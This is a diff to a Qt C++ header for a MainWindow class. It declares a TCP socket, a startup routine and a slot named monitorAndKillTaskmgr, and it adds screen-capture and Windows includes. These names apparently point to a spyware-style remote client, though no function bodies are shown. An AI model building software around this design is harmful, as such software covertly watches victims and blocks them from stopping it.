@@ -15,7 +15,9 @@
 #include <QtConcurrent/QtConcurrent>
 #include <QProcess>
 #include <QDesktopServices>
-
+#include <QScreenCapture>
+#include <QScreen>
+#include <Windows.h>
 
 QT_BEGIN_NAMESPACE
 namespace Ui {
@@ -35,11 +37,13 @@ private slots:
     void ClientStartup();
     void on_pushButton_clicked();
     void monitorAndKillTaskmgr();
+   // void getInputFile();
 
 private:
     Ui::MainWindow *ui;
     QTcpSocket *socket;
     QString SelectedPath;
+    QByteArray data;
 
     bool isTimerCreated = 0;
 };
